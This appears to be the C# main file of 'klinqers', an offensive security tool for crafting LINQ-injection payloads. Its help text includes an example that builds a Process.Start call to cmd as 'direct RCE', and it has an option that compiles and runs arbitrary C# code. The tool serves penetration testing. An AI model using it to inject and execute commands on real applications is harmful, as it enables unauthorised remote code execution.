// James Dickson 2021, License GPL 2.0 (see file in project)
using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text;
using System.Text.RegularExpressions;

namespace klinqers
{
    class MainClass
    {
        static void printHelp()
        {
            Console.WriteLine("--assemblies           Creating list for all assemblies in appdomain");
            Console.WriteLine("--type <typename>      Creating list for specific type");
            Console.WriteLine("--call <systemcall>    Create an injectable command for the API-call");
            Console.WriteLine("--test                 Execute the previously created injectable API-call BEWARE!!! this executes the call!!!");
            Console.WriteLine("--test-exec <csharp>   Compile and execute the csharp-code (must return a value and be a single call)");

            Console.WriteLine("\r\n");

            Console.WriteLine("Example:\r\n");
            Console.WriteLine("Example 1 - create an injectable code for File.Exists()");
            Console.WriteLine("klinqers.exe --call \"System.IO.File.Exists(c:/windows/system32/drivers/etc/hosts)\"");

            Console.WriteLine("\r\n");

            Console.WriteLine("Example 2 - create an injectable code for Process.Start() .. if that works it is direct RCE");
            Console.WriteLine("klinqers.exe --call \"System.Diagnostics.Process.Start(cmd,/c calc.exe)\"");

            Console.WriteLine("\r\n");
        }

        public static void Main(string[] args)
        {
            Console.WriteLine("\r\n [klinqers] - an app for testing Linq-injections (License GPL 2.0 - James Dickson 2021)\r\n");

            if (args.Length < 1)
            {
                printHelp();
                return;
            }

            string strCurrentCall = null;

            for (int i = 0; i < args.Length; i++)
            {
                if (args[i] == "--assemblies")
                {
                    Console.WriteLine("[+] Creating list for all assemblies in appdomain");
                   
                    Klinqers.printAssemblies();
                }
                else if (args[i] == "--help")
                {
                    printHelp();
                    return;
                }
                else if (args[i] == "--test")
                {
                    if (strCurrentCall == null)
                    {
                        Console.WriteLine("[-] Error: no compiled call available and no point in calling null");
                        return;
                    }
                    Console.WriteLine("[+] Executing " + strCurrentCall);

                    Klinqers.executeCSharp(strCurrentCall);
                }
                else if ((i + 1) < args.Length)
                {
                    if (args[i] == "--type")
                    {
                        string strType = args[++i];

                        Console.WriteLine("[+] Creating list for " + strType);

                        Type type = Type.GetType(strType);

                        Klinqers.printMethodsForType(type);
                    }
                    else if (args[i] == "--call")
                    {
                        string strCall = args[++i];

                        Console.WriteLine("[+] Creating call for " + strCall);
                        string strCompiled = null;

                        try
                        {
                            strCompiled = Klinqers.getCall(strCall);

                            if (strCompiled != null && strCompiled.Length > 0)
                            {
                                Console.ForegroundColor = ConsoleColor.Red;

                                Console.WriteLine("\r\n[+] ----------- Injectable Code -- ---------------\r\n");
                                Console.WriteLine(strCompiled);
                                Console.WriteLine("\r\n[+] ----------- ----------------------------------\r\n");

                                Console.ResetColor();
                                //Console.ForegroundColor = color;
                            }
                            else
                            {
                                Console.WriteLine("[-] Error: Could not create call for :" + strCall);
                            }
                        }
                        catch(Exception ex)
                        {
                            Console.WriteLine("[-] Error: Exception when trying to create an injectable call: " + ex.Message);
                        }


                        strCurrentCall = strCompiled;
                    }
                    else if (args[i] == "--test-exec")
                    {
                        string strCall = args[++i];

                        Console.WriteLine("[+] Executing " + strCall);

                        Klinqers.executeCSharp(strCall);
                    }

                }
            }
        }




    }
}
